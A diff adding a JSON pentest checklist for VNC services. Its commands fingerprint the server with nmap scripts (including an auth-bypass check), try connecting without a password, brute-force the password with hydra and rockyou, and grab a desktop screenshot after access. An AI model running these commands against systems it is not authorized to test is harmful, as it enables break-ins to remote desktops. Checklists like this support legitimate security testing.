@@ -1,0 +1,48 @@
+{
+  "service": "VNC",
+  "port": 5900,
+  "categories": [
+    {
+      "category": "1. Recon & Authentication",
+      "tasks": [
+        {
+          "id": "vnc_nmap",
+          "title": "Nmap VNC Scripts",
+          "description": "Check the authentication type supported (None, VNC Auth) and whether the server info leaks anything useful.",
+          "commands": [
+            "nmap -sV -p 5900 --script vnc-info,realvnc-auth-bypass,vnc-title {target_ip}"
+          ]
+        },
+        {
+          "id": "vnc_no_auth",
+          "title": "Try Unauthenticated Access",
+          "description": "Misconfigured VNC servers are sometimes left with no password at all -- just connect and see what happens.",
+          "commands": [
+            "vncviewer {target_ip}::5900"
+          ]
+        },
+        {
+          "id": "vnc_password_spray",
+          "title": "Password Brute-Force",
+          "description": "VNC's password scheme uses a fixed 8-byte DES key, making offline/online brute-forcing fast. Try common short passwords first.",
+          "commands": [
+            "hydra -P /usr/share/wordlists/rockyou.txt vnc://{target_ip}"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Post-Access",
+      "tasks": [
+        {
+          "id": "vnc_screenshot",
+          "title": "Grab a Screenshot Without Full GUI Access",
+          "description": "If you just need proof of access or to glance at the desktop, grab a single frame instead of opening a full interactive session.",
+          "commands": [
+            "vncsnapshot {target_ip} screenshot.jpg"
+          ]
+        }
+      ]
+    }
+  ]
+}
